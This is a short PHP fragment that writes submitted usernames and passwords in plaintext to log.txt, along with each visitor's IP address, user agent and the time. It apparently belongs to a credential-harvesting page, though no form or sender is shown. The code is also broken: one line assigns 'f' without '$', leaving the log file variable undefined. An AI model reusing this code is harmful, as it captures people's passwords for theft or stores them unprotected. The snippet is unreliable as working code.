$u = $_SERVER['REMOTE_ADDR'];
$a = $_SERVER['HTTP_USER_AGENT'];
$t = date('Y-m-d H:i:s');
f = "log.txt";
$c = "Username: $username, Password: $password, IP: $u, User-Agent: $a, Time: $t\n";
file_put_contents($f, $c, FILE_APPEND);
